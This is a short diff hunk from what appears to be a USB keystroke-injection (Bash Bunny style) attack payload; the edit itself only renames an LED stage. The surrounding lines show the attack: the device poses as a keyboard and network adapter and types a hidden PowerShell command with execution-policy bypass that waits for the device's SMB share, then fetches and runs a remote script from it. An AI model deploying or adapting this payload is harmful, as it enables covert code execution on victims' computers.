@@ -16,7 +16,7 @@ echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 
 ######## HID STAGE ########
 GET HOST_IP
-LED SETUP
+LED STAGE2
 ATTACKMODE HID RNDIS_ETHERNET
 RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"While (\$true) { If ((New-Object net.sockets.tcpclient ($HOST_IP,445)).Connected) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
 LED B 100
